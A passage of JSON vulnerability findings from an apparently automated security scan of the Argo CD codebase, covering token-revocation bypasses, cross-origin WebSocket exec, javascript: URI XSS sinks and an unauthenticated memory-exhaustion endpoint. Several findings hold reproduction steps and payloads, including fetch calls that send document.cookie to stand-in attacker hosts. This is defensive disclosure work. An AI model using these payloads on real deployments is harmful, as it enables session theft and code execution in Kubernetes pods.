= nil {\n        // ...\n    }\n}\n```\n\n## Reproduction Steps\n\n1. Open an exec session as a user with exec permissions\n2. As admin, remove exec permissions from the user's RBAC role\n3. Observe the active exec session continues to function with the original permissions\n4. New connection attempts are correctly denied, but existing sessions are unaffected\n","severity":"low","confidence":"tentative","tags":["archon","phase-8","false positive (adversarial)","poc-theoretical"],"status":"open","cvss_score":0,"source_file":"server/application/websocket.go:37","repo_name":"github.com/argoproj/argo-cd","matched_at":["server/application/websocket.go:37","server/application/websocket.go:66-67"],"finding_hash":"d41fe0438a4b983ec348ba7de6f0784e","found_at":"2026-04-09T18:07:34.412759Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":871,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p8-003","module_name":"When a WebSocket exec session's token is revoked, `performValidationsAndReconnect()` detects the error from `VerifyToken()` and calls `reconnect()`. The `reconnect()` function sends a reconnect messag","module_type":"whitebox","finding_source":"archon","module_short":"websocket-exec-survives-revocation","description":"## Summary\n\nWhen a WebSocket exec session's token is revoked, `performValidationsAndReconnect()` detects the error from `VerifyToken()` and calls `reconnect()`. The `reconnect()` function sends a reconnect message to the client and returns `(0, nil)` -- a success return. The calling `Read()` method treats this as success and proceeds to read the next WebSocket message, effectively continuing the exec session. The `validatePermissions()` check is never reached when the token is invalid.\n\n## Location\n\n- `server/application/websocket.go:158-177` -- performValidationsAndReconnect()\n- `server/application/websocket.go:112-133` -- reconnect() returns (0, nil) on success\n- `server/application/websocket.go:180-211` -- Read() continues on (0, nil) return\n\n## Attacker Control\n\n- Attacker maintains an open WebSocket exec session\n- Token revocation by admin does not terminate the session\n- Attacker continues executing commands in Kubernetes pods after their access should be revoked\n\n## Trust Boundary Crossed\n\nSession lifecycle boundary -- admin's ability to terminate active exec sessions via token revocation is bypassed.\n\n## Impact\n\n- Users whose tokens are revoked (offboarding, security incident, password change) retain active exec sessions\n- kubectl exec in Kubernetes pods continues indefinitely until WebSocket disconnects\n- This is the highest-privilege action in ArgoCD (direct pod access) and the one most critical to terminate during incidents\n- Historical precedent: CVE-2024-41666 (GHSA-v8wx-v5jq-qhhw)\n\n## Evidence\n\n```go\n// websocket.go:158-177\nfunc (t *terminalSession) performValidationsAndReconnect(p []byte) (int, error) {\n    if t.terminalOpts.DisableAuth {\n        return 0, nil\n    }\n    _, newToken, err := t.sessionManager.VerifyToken(t.ctx, *t.token)\n    if err != nil || newToken != \"\" {\n        // Token revoked (err != nil) OR refreshed (newToken != \"\")\n        // BOTH cases trigger reconnect, which returns (0, nil)\n        return t.reconnect()  // \u003c-- returns (0, nil), not an error\n    }\n    // validatePermissions() only reached if err==nil AND newToken==\"\"\n    code, err := t.validatePermissions(p)\n    if err != nil {\n        return code, err\n    }\n    return 0, nil\n}\n```\n\n## Reproduction Steps\n\n1. Enable web terminal in ArgoCD\n2. As a user with exec permissions, open an exec session to a pod\n3. As admin, revoke the user's token (change password, disable account, or explicit revocation)\n4. Observe the exec session continues to function -- commands are still executed\n5. The client receives a reconnect message but the server-side exec session persists\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-theoretical"],"status":"open","cvss_score":0,"source_file":"server/application/websocket.go:158-177","repo_name":"github.com/argoproj/argo-cd","matched_at":["server/application/websocket.go:158-177","server/application/websocket.go:112-133","server/application/websocket.go:180-211"],"finding_hash":"26837f6cc8fa920f0c6925d2d422cba6","found_at":"2026-04-09T18:07:34.412758Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":870,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p8-002","module_name":"When verifying OIDC tokens, ArgoCD computes a revocation identifier from `jti` claim or `AccessTokenHash`. If both are absent (common with some enterprise OIDC providers), the identifier becomes an em","module_type":"whitebox","finding_source":"archon","module_short":"oidc-empty-jti-revocation-bypass","description":"## Summary\n\nWhen verifying OIDC tokens, ArgoCD computes a revocation identifier from `jti` claim or `AccessTokenHash`. If both are absent (common with some enterprise OIDC providers), the identifier becomes an empty string. `IsTokenRevoked(\"\")` checks for key `\"\"` in the revocation map, which returns `false` unless someone explicitly revoked the empty string -- and doing so would simultaneously affect ALL tokens with empty identifiers.\n\n## Location\n\n- `util/session/sessionmanager.go:604-616` -- revocation ID computation in VerifyToken()\n- `util/session/state.go:133-136` -- IsTokenRevoked() map lookup\n\n## Attacker Control\n\n- Attacker controls use of a token from an OIDC provider that omits `jti` claim\n- The empty-string revocation ID is deterministic and cannot be individually targeted for revocation\n\n## Trust Boundary Crossed\n\nSession revocation boundary -- admin's ability to forcibly terminate user sessions is bypassed for tokens with empty identifiers.\n\n## Impact\n\n- Compromised OIDC tokens cannot be revoked until natural expiry\n- During security incidents (account compromise, employee termination), forced logout is impossible\n- If admin revokes `\"\"`, ALL empty-jti tokens are simultaneously invalidated (collateral damage)\n\n## Evidence\n\n```go\n// sessionmanager.go:604-612\nid, ok := claims[\"jti\"].(string)\nif !ok {\n    log.Warnf(\"token does not have jti claim\")\n    id = \"\"\n}\nif id == \"\" {\n    id = idToken.AccessTokenHash\n}\n// If AccessTokenHash is also empty, id remains \"\"\n\n// state.go:133-136\nfunc (storage *userStateStorage) IsTokenRevoked(id string) bool {\n    storage.lock.RLock()\n    defer storage.lock.RUnlock()\n    return storage.revokedTokens[id]  // map[\"\"] returns false\n}\n```\n\n## Reproduction Steps\n\n1. Configure ArgoCD with an OIDC provider that does not include `jti` in id_tokens and does not return an access token (only id_token)\n2. Log in via SSO and observe the token has no jti claim\n3. As admin, attempt to revoke the user's token via the ArgoCD API\n4. The revocation targets `id=\"\"` -- verify the user can still access ArgoCD\n5. Observe `log.Warnf(\"token does not have jti claim\")` in server logs\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-theoretical"],"status":"open","cvss_score":0,"source_file":"util/session/sessionmanager.go:604-616","repo_name":"github.com/argoproj/argo-cd","matched_at":["util/session/sessionmanager.go:604-616","util/session/state.go:133-136"],"finding_hash":"eee36d9ba1ee9c25dbb18de070b9efea","found_at":"2026-04-09T18:07:34.41275Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":869,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p8-001","module_name":"The WebSocket upgrader in `server/application/websocket.go` unconditionally accepts all origins (`CheckOrigin = func(_ *http.Request) bool { return true }`). Because the `argocd.token` authentication ","module_type":"whitebox","finding_source":"archon","module_short":"websocket-check-origin-csrf","description":"## Summary\n\nThe WebSocket upgrader in `server/application/websocket.go` unconditionally accepts all origins (`CheckOrigin = func(_ *http.Request) bool { return true }`). Because the `argocd.token` authentication cookie is set with `SameSite=Lax`, browsers send the cookie on cross-origin WebSocket upgrade requests (treated as top-level navigation). An attacker hosting a malicious web page can establish WebSocket connections to the ArgoCD exec terminal endpoint using the victim's authenticated session, enabling remote code execution in Kubernetes pods.\n\n## Location\n\n- `server/application/websocket.go:26-33` -- WebSocket upgrader with CheckOrigin always true\n- `server/application/websocket.go:56-77` -- `newTerminalSession()` reads auth cookie and upgrades connection\n- `util/http/http.go:242-260` -- `SetTokenCookie()` sets SameSite=Lax, httpOnly, conditionally Secure\n\n## Attacker Control\n\n- Attacker controls the origin of the WebSocket upgrade request (cross-origin malicious page)\n- Attacker controls the WebSocket messages sent after connection (exec commands)\n- Victim's browser automatically attaches the `argocd.token` cookie due to SameSite=Lax\n\n## Trust Boundary Crossed\n\nCross-origin JavaScript (attacker domain) to same-origin exec session (ArgoCD domain). The WebSocket Same-Origin Policy is bypassed by the permissive CheckOrigin function.\n\n## Impact\n\n- Remote code execution in Kubernetes pods accessible to the victim's RBAC role\n- If victim has admin role with exec permissions, attacker gains kubectl exec in any managed pod\n- Attack is silent -- victim only needs to visit a page while authenticated to ArgoCD\n- Chains with PH-04 (anonymous RBAC): if AnonymousUserEnabled=true with exec permissions, becomes unauthenticated RCE\n\n## Evidence\n\n```go\n// server/application/websocket.go:26-33\nvar upgrader = func() websocket.Upgrader {\n    upgrader := websocket.Upgrader{}\n    upgrader.HandshakeTimeout = time.Second * 2\n    upgrader.CheckOrigin = func(_ *http.Request) bool {\n        return true\n    }\n    return upgrader\n}()\n```\n\nCookie attributes (from `util/http/http.go:248`):\n```go\nflags := []string{cookiePath, \"SameSite=lax\", \"httpOnly\"}\nif isSecure {\n    flags = append(flags, \"Secure\")\n}\n```\n\n## Reproduction Steps\n\n1. Deploy ArgoCD with exec enabled (default when web terminal feature is on)\n2. Log in as a user with exec permissions\n3. From a different origin, create a page with JavaScript that opens a WebSocket to `wss://\u003cargocd-host\u003e/api/v1/exec?...`\n4. Observe the browser sends the `argocd.token` cookie with the upgrade request\n5. The WebSocket connection is established and exec commands can be sent\n6. Verify by running `id` or `whoami` through the WebSocket exec channel\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-theoretical"],"status":"open","cvss_score":0,"source_file":"server/application/websocket.go:26-33","repo_name":"github.com/argoproj/argo-cd","matched_at":["server/application/websocket.go:26-33","server/application/websocket.go:56-77","util/http/http.go:242-260"],"finding_hash":"b169f8a7c4125e5fa5bbca21d8cdf8e6","found_at":"2026-04-09T18:07:34.412749Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":868,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-038","module_name":"The ArgoCD repo-server fetches OCI image metadata from registry annotations and populates `OCIMetadata.DocsURL` (from `org.opencontainers.image.documentation`) and `OCIMetadata.SourceURL` (from `org.o","module_type":"whitebox","finding_source":"archon","module_short":"xss-oci-metadata-url-fields-unvalidated","description":"## Summary\n\nThe ArgoCD repo-server fetches OCI image metadata from registry annotations and populates `OCIMetadata.DocsURL` (from `org.opencontainers.image.documentation`) and `OCIMetadata.SourceURL` (from `org.opencontainers.image.source`). These fields flow to the frontend via the `GetOCIMetadata` RPC and are defined in the TypeScript model (`models.ts:118-119`). No URL validation exists at any point in this pipeline — not in the repo-server, not in the API server, not in the frontend.\n\nThe fields are currently returned in API responses but not rendered as clickable links in the UI. However, the identical pipeline structure to the confirmed `home` field XSS (p8-082) means any UI change that renders them as links (a natural feature addition given that documentation and source URLs are meant to be navigated to) would be immediately exploitable by any attacker who can publish an OCI Helm chart to a registry reachable by ArgoCD.\n\nThe attack surface is broader than the Helm `home` field because OCI registries are the primary distribution channel for modern Helm charts and are set via `oci://` repoURLs — a growing deployment pattern.\n\n## Location\n\n- **Server-side source**: `reposerver/repository/repository.go:2751-2752`\n  - `DocsURL: a[\"org.opencontainers.image.documentation\"]` (no validation)\n  - `SourceURL: a[\"org.opencontainers.image.source\"]` (no validation)\n- **Type definition**: `pkg/apis/application/v1alpha1/types.go:1701-1703`\n- **Frontend model**: `ui/src/app/shared/models.ts:118-119`\n- **Current UI render location (no clickable link yet)**: `ui/src/app/applications/components/application-details/application-details.tsx:354-372` and `ui/src/app/applications/components/application-deployment-history/revision-metadata-rows.tsx:13-29`\n\n## Attacker Control\n\nAn attacker who can push an OCI Helm chart to any OCI registry configured in ArgoCD can set arbitrary values in OCI image annotations:\n\n```\norg.opencontainers.image.documentation: \"javascript:alert(document.cookie)\"\norg.opencontainers.image.source: \"javascript:fetch('https://attacker.com/?c='+document.cookie)\"\n```\n\nThese are standard OCI image spec annotation fields. Any OCI-compliant registry accepts them without validation. The Helm chart author controls them entirely.\n\n## Trust Boundary Crossed\n\nOCI chart author (external, untrusted) → OCI registry annotations → ArgoCD repo-server (no validation) → API response → ArgoCD UI frontend (no validation)\n\n## Impact\n\n- **Current state**: MEDIUM risk — fields are in the live API response, no active render as links\n- **If UI renders these as links**: Immediate HIGH/CRITICAL supply chain XSS identical to p8-082, affecting all users viewing OCI-sourced application details\n- **Scope**: All applications using `oci://` chart repositories — the fastest-growing Helm distribution pattern\n\n## Evidence\n\n```go\n// reposerver/repository/repository.go:2746-2755\nreturn \u0026v1alpha1.OCIMetadata{\n    CreatedAt: a[\"org.opencontainers.image.created\"],\n    Authors:   a[\"org.opencontainers.image.authors\"],\n    // TODO: add this field at a later stage\n    // ImageURL:    a[\"org.opencontainers.image.url\"],\n    DocsURL:     a[\"org.opencontainers.image.documentation\"],  // NO validation\n    SourceURL:   a[\"org.opencontainers.image.source\"],          // NO validation\n    Version:     a[\"org.opencontainers.image.version\"],\n    Description: a[\"org.opencontainers.image.description\"],\n}, nil\n```\n\n```typescript\n// ui/src/app/shared/models.ts:115-122\nexport interface OCIMetadata {\n    createdAt: string;\n    authors: string;\n    docsUrl: string;    // populated from org.opencontainers.image.documentation\n    sourceUrl: string;  // populated from org.opencontainers.image.source\n    version: string;\n    description: string;\n}\n```\n\nThe `// TODO: add this field at a later stage` comment for `ImageURL` in the Go source confirms that `DocsURL` and `SourceURL` are already planned for UI display — meaning this pipeline will inevitably produce clickable links.\n\n## Reproduction Steps\n\n1. Build an OCI Helm chart with malicious annotations:\n   ```\n   org.opencontainers.image.documentation: \"javascript:alert(document.cookie)\"\n   org.opencontainers.image.source: \"javascript:alert(1)\"\n   ```\n2. Push to an OCI registry accessible from ArgoCD.\n3. Create an ArgoCD Application pointing to `oci://registry/chart:version`.\n4. Call the ArgoCD API: `GET /api/v1/applications/{name}/revisions/{revision}/ociMetadata`\n5. Verify the response contains unvalidated `docsUrl` and `sourceUrl` values.\n6. When/if the UI adds a render path for these fields as clickable links (currently under TODO), XSS fires on click without any additional attacker action.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-pending"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"83e5fdf2c5d3101478a7e4433215f149","found_at":"2026-04-09T18:07:34.412747Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":867,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-037","module_name":"The Application Sync Panel renders `source.repoURL` directly as an `href` attribute in an anchor tag without calling `isValidURL()`. A `javascript:` URI set as `spec.source.repoURL` would execute Java","module_type":"whitebox","finding_source":"archon","module_short":"xss-repourl-href-sync-panel","description":"## Summary\n\nThe Application Sync Panel renders `source.repoURL` directly as an `href` attribute in an anchor tag without calling `isValidURL()`. A `javascript:` URI set as `spec.source.repoURL` would execute JavaScript when a user clicks the link in the sync panel header. The sync panel is opened by any user who clicks the \"Sync\" button on an Application — making this a broad-exposure vector for any Application with a crafted repoURL.\n\n## Location\n\n- **Sink**: `ui/src/app/applications/components/application-sync-panel/application-sync-panel.tsx:252`\n\n## Attacker Control\n\n`source.repoURL` is `Application.spec.source.repoURL`. Control vectors are the same as p10-036:\n\n1. **Direct**: Any user with Application create/update RBAC permission\n2. **ApplicationSet chain (p8-047)**: SCM provider empty-allowlist bypass injects arbitrary URLs into `spec.source.repoURL`\n\n## Trust Boundary Crossed\n\nApplication author or external SCM API → Application spec → browser context of any user who opens the Sync panel for the Application\n\n## Impact\n\n- JavaScript executes as soon as a user clicks the sync panel link\n- The sync panel is a common workflow step, increasing likelihood of user interaction\n- Session token exfiltration or forced sync/rollback actions possible\n\n## Evidence\n\n```typescript\n// application-sync-panel.tsx:251-253 (VULNERABLE)\n\u003ch6\u003e\n    Synchronizing application manifests from \u003ca href={source.repoURL}\u003e{source.repoURL}\u003c/a\u003e\n\u003c/h6\u003e\n```\n\nThis is a bare `href={source.repoURL}` with no validation. Compare to the protected pattern in `application-urls.tsx`:\n\n```typescript\n// application-urls.tsx:26-28 (PROTECTED — validation present)\nif (!isValidURL(this.ref)) {\n    throw new InvalidExternalLinkError('Invalid URL');\n}\n```\n\n## Reproduction Steps\n\n1. Create an ArgoCD Application with `spec.source.repoURL: \"javascript:alert(document.cookie)\"`.\n2. Navigate to the Application Details page.\n3. Click the \"Sync\" button to open the sync panel.\n4. The sync panel header renders: `Synchronizing application manifests from \u003ca href=\"javascript:...\"\u003e`.\n5. Click the link — JavaScript executes in the ArgoCD UI browser context.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","duplicate","poc-pending"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"cffb45e0e409353eb94cd099112ddd76","found_at":"2026-04-09T18:07:34.412746Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":866,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-036","module_name":"When `revisionChartDetails` returns null or undefined for a Helm chart application, the UI falls back to rendering a clickable external-link icon that calls `window.open(aSource.repoURL)`. The `aSourc","module_type":"whitebox","finding_source":"archon","module_short":"xss-repourl-window-open-fallback","description":"## Summary\n\nWhen `revisionChartDetails` returns null or undefined for a Helm chart application, the UI falls back to rendering a clickable external-link icon that calls `window.open(aSource.repoURL)`. The `aSource.repoURL` value is taken directly from `Application.spec.source.repoURL` with no URL scheme validation. An attacker who can set `spec.source.repoURL` to a `javascript:` URI (either by directly creating/editing an Application, or by exploiting the empty-allowlist SCM provider bypass in p8-047) will cause JavaScript execution in the browser of any ArgoCD user who clicks the fallback link icon in the deployment history or application details panel.\n\nTwo separate call sites share this same vulnerable pattern within the `getContentForChart` function.\n\n## Location\n\n- **Sink 1**: `ui/src/app/applications/components/application-details/application-details.tsx:388`\n  - Fallback within `getContentForOci` function: `window.open(aSource.repoURL)`\n- **Sink 2**: `ui/src/app/applications/components/application-details/application-details.tsx:480`\n  - Fallback within `getContentForChart` function: `window.open(aSource.repoURL)`\n\n## Attacker Control\n\n`aSource.repoURL` is `Application.spec.source.repoURL`. An attacker reaches this field via:\n\n1. **Direct Application write**: Any user with RBAC permission to create or update ArgoCD Applications can set `spec.source.repoURL: \"javascript:alert(document.cookie)\"`.\n2. **ApplicationSet SCM provider chain (p8-047)**: The empty `allowedSCMProviders` allowlist bypass allows an attacker-controlled SCM API to inject arbitrary URLs into Application `spec.source.repoURL` without operator interaction.\n\n## Trust Boundary Crossed\n\nApplication author or SCM API response (potentially external/untrusted via p8-047 chain) → ArgoCD Application spec storage → UI rendering in browser of any user viewing application details\n\n## Impact\n\n- JavaScript executes in the ArgoCD UI browser context when a user clicks the fallback external-link icon\n- Session token exfiltration or UI action forgery\n- Severity is MEDIUM for direct path (requires Application write permission); escalates if combined with p8-047 (SCM provider injection enables unauthenticated attacker to set repoURL)\n\n## Evidence\n\n```typescript\n// application-details.tsx:374-397 (Sink 1 — OCI fallback branch)\n) : (\n    \u003cdiv key={indx} className='white-box' style={{marginTop: '1.5em'}}\u003e\n        \u003cdiv\u003eSource {indx + 1}\u003c/div\u003e\n        \u003cdiv className='white-box__details'\u003e\n            {showChartNonMetadataInfo(aRevision, aSource.repoURL)}\n            \u003cdiv className='row white-box__details-row'\u003e\n                \u003cdiv className='columns small-3'\u003eHelm Chart:\u003c/div\u003e\n                \u003cdiv className='columns small-9'\u003e\n                    {aSource.chart}\u0026nbsp;\n                    {\n                        \u003ca\n                            title={sources[indx].chart}\n                            onClick={e =\u003e {\n                                e.stopPropagation();\n                                window.open(aSource.repoURL);  // NO isValidURL() check\n                            }}\u003e\n                            \u003ci className='fa fa-external-link-alt' /\u003e\n                        \u003c/a\u003e\n                    }\n```\n\n```typescript\n// application-details.tsx:467-489 (Sink 2 — Helm chart details fallback branch)\n) : (\n    \u003cdiv key={indx} className='white-box' style={{marginTop: '1.5em'}}\u003e\n        \u003cdiv\u003eSource {indx + 1}\u003c/div\u003e\n        \u003cdiv className='white-box__details'\u003e\n            ...\n                        \u003ca\n                            title={sources[indx].chart}\n                            onClick={e =\u003e {\n                                e.stopPropagation();\n                                window.open(aSource.repoURL);  // NO isValidURL() check\n                            }}\u003e\n```\n\nContrast with the protected path in `application-urls.tsx:26-28`:\n```typescript\nif (!isValidURL(this.ref)) {\n    throw new InvalidExternalLinkError('Invalid URL');\n}\n```\n\n## Reproduction Steps\n\n1. Create an ArgoCD Application with `spec.source.repoURL: \"javascript:alert(document.cookie)\"` and `spec.source.chart` set to a non-existent chart name (to trigger the fallback render path where `revisionChartDetails` returns null).\n2. Navigate to the Application Details page or Deployment History.\n3. The fallback UI renders an external-link icon using `window.open(aSource.repoURL)`.\n4. Click the icon — JavaScript executes in the ArgoCD UI context.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-theoretical"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"000649e940db58a40a1dc0d5134a68ec","found_at":"2026-04-09T18:07:34.412745Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":865,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-032","module_name":"The `getLinks()` service method in `applications-service.ts` returns application-level deep link URLs from the server API without applying `isValidURL()` filtering. In contrast, the sibling `getResour","module_type":"whitebox","finding_source":"archon","module_short":"xss-deeplinks-getlinks-no-validation","description":"## Summary\n\nThe `getLinks()` service method in `applications-service.ts` returns application-level deep link URLs from the server API without applying `isValidURL()` filtering. In contrast, the sibling `getResourceLinks()` method (line 519) explicitly filters every `LinkInfo` item through `isValidURL()` before returning the response. The unfiltered URLs reach the `DeepLinks` React component, which applies only a `startsWith('http')` check. A URL beginning with `javascript:` fails this check and is passed to React Router v4's `\u003cLink to={link.url}\u003e` component, which renders an `\u003ca href=\"javascript:...\"\u003e` element. Clicking the link executes attacker-controlled JavaScript in the ArgoCD UI origin.\n\nThe deep link URL is the result of evaluating a Go `text/template` (from `argocd-cm`, admin-controlled) against the Application object. The template data includes Application metadata fields — annotations, labels, and `spec.info` entries — that any user who can write to the Application resource can control. An admin who configures a template referencing an attacker-controlled field (e.g., `{{index .metadata.annotations \"example.com/link\"}}`) creates a stored XSS vector exploitable by lower-privileged users.\n\n## Location\n\n- **Sink**: `ui/src/app/shared/components/deep-links.tsx:11-18` — `startsWith('http')` check falls through to `\u003cLink to={link.url}\u003e` for `javascript:` URIs; React Router v4 renders as `\u003ca href=\"javascript:...\"\u003e`\n- **Missing filter**: `ui/src/app/shared/services/applications-service.ts:511-517` — `getLinks()` returns raw server response without `isValidURL()` filtering (contrast: `getResourceLinks()` at line 536 does filter)\n- **Server-side source**: `server/deeplinks/deeplinks.go:115-129` — Go template executed against Application object; result URL stored in `LinkInfo.Url` with no protocol validation\n- **Protected parallel path**: `ui/src/app/shared/services/applications-service.ts:536` — `getResourceLinks()` calls `isValidURL(link.url)` before including items in response\n\n## Attacker Control\n\nTwo-step exploitation:\n\n1. An ArgoCD admin configures a deep link template in `argocd-cm` that dereferences an Application annotation or `spec.info` value:\n   ```yaml\n   additionalLinks:\n   - title: \"Project Home\"\n     url: \"{{index .metadata.annotations \\\"myorg.io/home-url\\\"}}\"\n   ```\n\n2. Any user with write access to the Application resource (ArgoCD `applications, update` permission or `kubectl apply`) sets the annotation to a `javascript:` URI:\n   ```\n   kubectl annotate application my-app myorg.io/home-url=\"javascript:fetch('https://attacker.example/steal?c='+document.cookie)\"\n   ```\n\nThe controller renders `LinkInfo.Url = \"javascript:...\"`, which `getLinks()` returns unfiltered. `DeepLinks` renders it via `\u003cLink to=\"javascript:...\"\u003e`.\n\nRequired privilege to exploit step 2: ArgoCD RBAC `applications, update` (standard developer privilege in most deployments) or `kubectl` write access to the ArgoCD namespace.\n\n## Trust Boundary Crossed\n\nApplication resource writer (developer-level) -\u003e ArgoCD API server (template evaluation, no protocol validation) -\u003e ArgoCD UI `getLinks()` (no filtering) -\u003e all users viewing the application summary page LINKS section\n\n## Impact\n\n- **Session hijacking**: Attacker JavaScript executes in the ArgoCD UI origin context, with access to session tokens and cookies\n- **Scope**: Affects all users viewing the application summary LINKS section for the compromised application\n- **Persistence**: The malicious annotation persists across reconciliations\n- **Defense gap**: `getResourceLinks()` already contains the correct fix pattern (`isValidURL()` filtering); `getLinks()` is the missed instance\n\n## Evidence\n\n```typescript\n// applications-service.ts:511-517 (VULNERABLE — no isValidURL filtering)\npublic getLinks(applicationName: string, namespace: string): Promise\u003cmodels.LinksResponse\u003e {\n    return requests\n        .get(`/applications/${applicationName}/links`)\n        .query({namespace})\n        .send()\n        .then(res =\u003e res.body as models.LinksResponse);  // raw, unfiltered\n}\n\n// applications-service.ts:519-543 (PROTECTED — contrast)\npublic getResourceLinks(...): Promise\u003cmodels.LinksResponse\u003e {\n    // ...\n    (links?.items || []).forEach(link =\u003e {\n        if (isValidURL(link.url)) {   // \u003c-- isValidURL called here\n            items.push(link);\n        }\n    });\n    // ...\n}\n```\n\n```typescript\n// deep-links.tsx:11-18 (PARTIAL CHECK — only startsWith('http'), not isValidURL)\n{link.url.startsWith('http') ? (\n    \u003ca href={link.url} target='_blank' rel='noopener' ...\u003e\n        ...\n    \u003c/a\u003e\n) : (\n    \u003cLink to={link.url} ...\u003e   // React Router v4: renders as \u003ca href={link.url}\u003e\n        ...\n    \u003c/Link\u003e\n)}\n```\n\n```go\n// server/deeplinks/deeplinks.go:115-129 (template evaluated against app object, no URL validation)\nt, err := template.New(\"deep-link\").Funcs(sprigFuncMap).Parse(link.URL)\n// ...\nerr = t.Execute(\u0026finalURL, obj)\n// ...\nfinalLinks = append(finalLinks, \u0026application.LinkInfo{\n    Url: new(finalURL.String()),  // no isValidURL check\n})\n```\n\n## Reproduction Steps\n\n1. As an ArgoCD admin, add a deep link template to `argocd-cm` that references an annotation:\n   ```yaml\n   kubectl edit configmap argocd-cm -n argocd\n   # Add under data:\n   # additionalLinks: |\n   #   - title: \"External Link\"\n   #     url: \"{{index .metadata.annotations \\\"myorg.io/home\\\"}}\"\n   ```\n\n2. As a developer (with application update permission), set the annotation on the target Application:\n   ```\n   kubectl annotate application my-app -n argocd myorg.io/home=\"javascript:alert(document.cookie)\"\n   ```\n\n3. Navigate to the ArgoCD UI application summary page for `my-app`\n\n4. Observe the \"LINKS\" section contains an \"External Link\" entry\n\n5. Click the link — JavaScript executes in the ArgoCD UI context\n\nNote: Step 1 requires admin access. Step 2 requires only developer-level ArgoCD RBAC. If an admin already has a template referencing attacker-controlled fields, only step 2 is needed.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-theoretical"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"07c51331ae0e50c992943ed9e1868518","found_at":"2026-04-09T18:07:34.412744Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":864,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-030","module_name":"The OIDC `HandleCallback` handler at `util/oidc/oidc.go:508` calls `r.FormValue()` multiple times without first wrapping `r.Body` with `http.MaxBytesReader`. Go's standard library `FormValue` triggers","module_type":"whitebox","finding_source":"archon","module_short":"oidc-callback-no-maxbytesreader","description":"## Summary\n\nThe OIDC `HandleCallback` handler at `util/oidc/oidc.go:508` calls `r.FormValue()` multiple times without first wrapping `r.Body` with `http.MaxBytesReader`. Go's standard library `FormValue` triggers `ParseForm`, which calls `io.ReadAll(r.Body)` for `application/x-www-form-urlencoded` POST bodies with no size limit. A single large POST to `/auth/callback` exhausts argocd-server process memory. This endpoint is unauthenticated and must be reachable from the browser (and thus internet) in any SSO-enabled deployment.\n\n## Location\n\n- `util/oidc/oidc.go:508-580` — `HandleCallback` function, no MaxBytesReader before first `r.FormValue` call at line 516\n- `server/server.go:1365` — registered at `common.CallbackEndpoint` (`/auth/callback`)\n- `util/webhook/webhook.go:641` — contrast: main webhook handler applies MaxBytesReader\n\n## Attacker Control\n\n- Unauthenticated HTTP POST to `/auth/callback`\n- Attacker sets `Content-Type: application/x-www-form-urlencoded` and sends a multi-gigabyte body\n- First `r.FormValue(\"error\")` call at line 516 triggers the unbounded body read before any validation\n\n## Trust Boundary Crossed\n\nInternet (unauthenticated) -\u003e argocd-server process memory (OOM kill disrupts all API operations)\n\n## Impact\n\n1. **argocd-server OOM**: Single large POST kills the argocd-server pod\n2. **Total service disruption**: All ArgoCD API operations cease during restart\n3. **Repeated attack**: Continuous large POSTs sustain denial of service\n4. **No authentication required**: /auth/callback is the OAuth2 callback endpoint; it must accept unauthenticated requests\n5. **Higher severity than AppSet variant**: argocd-server is internet-facing by default; AppSet webhook requires non-default exposure\n\n## Evidence\n\nHandleCallback with no MaxBytesReader (`util/oidc/oidc.go:508-522`):\n```go\nfunc (a *ClientApp) HandleCallback(w http.ResponseWriter, r *http.Request) {\n    oauth2Config, err := a.getOauth2ConfigForRedirectURI(...)\n    ...\n    if errMsg := r.FormValue(\"error\"); errMsg != \"\" {  // line 516: triggers io.ReadAll(r.Body) on POST\n        errorDesc := r.FormValue(\"error_description\")\n        ...\n    }\n    code := r.FormValue(\"code\")   // line 521\n    state := r.FormValue(\"state\") // line 522\n```\n\nRegistration in server (`server/server.go:1365`):\n```go\nmux.Handle(common.CallbackEndpoint, otelhttp.NewHandler(http.HandlerFunc(server.ssoClientApp.HandleCallback), \"server.ClientApp/HandleCallback\"))\n```\n\nNo global body limit on http.Server — confirmed by absence of ReadTimeout, MaxBytesReader, or LimitReader in server.go middleware chain.\n\nReference: main webhook handler with protection (`util/webhook/webhook.go:641`):\n```go\nr.Body = http.MaxBytesReader(w, r.Body, 